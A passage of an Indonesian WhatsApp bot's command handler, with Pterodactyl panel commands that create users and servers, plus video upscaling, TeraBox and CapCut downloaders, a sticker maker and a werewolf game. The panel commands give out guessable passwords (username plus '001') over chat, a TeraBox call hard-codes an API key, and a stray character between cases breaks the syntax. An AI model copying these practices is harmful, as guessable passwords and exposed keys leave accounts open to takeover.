  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '9gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '10gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "10050"
let cpu = "300"
let disk = "10050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
//==================================================================
l
case "hdvideo":
case "hdvid": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return RyuuBotz.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return RyuuBotz.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return RyuuBotz.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        RyuuBotz.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return RyuuBotz.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await RyuuBotz.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video berhasil ditingkatkan kualitasnya!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        RyuuBotz.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('linknya mana kak')
reply(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=ReinzIDgembul`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
RyuuBotz.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break
//==================================================================
case 'capcutdl':case 'cc': case 'capcut': {
const axios = require('axios')
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}
if (!text.includes('www.capcut.net')) return reply('masukan link cc!!')
let hasil = await download(text)
try {
let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
deku += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
deku += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
deku += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`
await RyuuBotz.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: deku }, { quoted: m })
} catch (e) {
 reply('error kak...')
}

}
break
case 'brat2': {
const { createCanvas, registerFont } = require('canvas');
const Jimp = require('jimp');
async function BratGenerator(teks) {
  let width = 512;
  let height = 512;
  let margin = 20;
  let wordSpacing = 50; 
  let canvas = createCanvas(width, height);
  let ctx = canvas.getContext('2d');
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, width, height);
  let fontSize = 280;
  let lineHeightMultiplier = 1.3;
  ctx.textAlign = 'left';
  ctx.textBaseline = 'top';
  ctx.fillStyle = 'black';
registerFont('./node_modules/Arisu-MD/lib/arialnarrow.ttf', { family: 'Narrow' });
  let words = teks.split(' ');
  let lines = [];
  let rebuildLines = () => {
    lines = [];
    let currentLine = '';
    for (let word of words) {
      let testLine = currentLine ? `${currentLine} ${word}` : word;
      let lineWidth =
        ctx.measureText(testLine).width + (currentLine.split(' ').length - 1) * wordSpacing;
      if (lineWidth < width - 2 * margin) {
        currentLine = testLine;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    if (currentLine) {
      lines.push(currentLine);
    }
  };
  ctx.font = `${fontSize}px Narrow`;
  rebuildLines();
  while (lines.length * fontSize * lineHeightMultiplier > height - 2 * margin) {
    fontSize -= 2;
    ctx.font = `${fontSize}px Narrow`;
    rebuildLines();
  }
    let lineHeight = fontSize * lineHeightMultiplier;
  let y = margin;
  for (let line of lines) {
    let wordsInLine = line.split(' ');
    let x = margin;
    for (let word of wordsInLine) {
      ctx.fillText(word, x, y);
      x += ctx.measureText(word).width + wordSpacing;
    }
    y += lineHeight;
  }
  let buffer = canvas.toBuffer('image/png');
  let image = await Jimp.read(buffer);
  image.blur(3);
  let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
return RyuuBotz.sendImageAsSticker(m.chat, blurredBuffer, m, { packname: "ReinzID Chx", author: "ReinzID Chx|Yoimiya-Ai" })
}
if (!text) return reply(`Masukkan teks untuk stiker.\n\nContoh:\n.brat Atmin Ganteng`);
return BratGenerator(text)
}
break
//==================================================================
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    RyuuBotz.werewolf = RyuuBotz.werewolf ? RyuuBotz.werewolf : {};
    const ww = RyuuBotz.werewolf ? RyuuBotz.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        RyuuBotz.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(RyuuBotz, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(RyuuBotz, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(RyuuBotz, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${RyuuBotz.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${RyuuBotz.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${RyuuBotz.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await RyuuBotz.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${RyuuBotz.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${RyuuBotz.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await RyuuBotz.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await RyuuBotz.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(RyuuBotz, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        RyuuBotz.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        RyuuBotz.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    RyuuBotz.werewolf = RyuuBotz.werewolf ? RyuuBotz.werewolf : {};
    const ww = RyuuBotz.werewolf ? RyuuBotz.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
